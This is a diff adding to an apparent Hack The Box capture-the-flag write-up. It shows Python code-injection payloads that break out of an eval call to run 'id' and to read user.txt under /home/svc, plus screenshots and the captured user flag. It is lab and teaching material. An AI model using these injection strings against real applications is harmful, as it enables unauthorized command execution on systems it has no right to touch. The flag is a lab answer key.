@@ -68,4 +68,28 @@ What it will look like:
 url = eval(Engine.<some_engine>.search('') + str(__import__('os').system('id')) #', copy_url={copy}, open_web={open})")
 ```
 
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/60c5b8bd-f160-4eb2-a9b9-b206961c9dc4)
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/322d7a72-6ea5-414e-97de-030dedb402e3)
+
+
+Long story short, I got the user.txt inside the /home/svc directory.
+
+```
+') + str(__import__('os').system('cd .. && cd .. && cd .. && cd home && cd svc && cat user.txt && ls -a')) #
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ce1079fb-52db-4f00-a420-1661b7804100)
+
+
+## USER FLAG
+
+```
+d8ad3edaacebd00c00e4b7c6fbdfbb77
+```
+
+
+
 
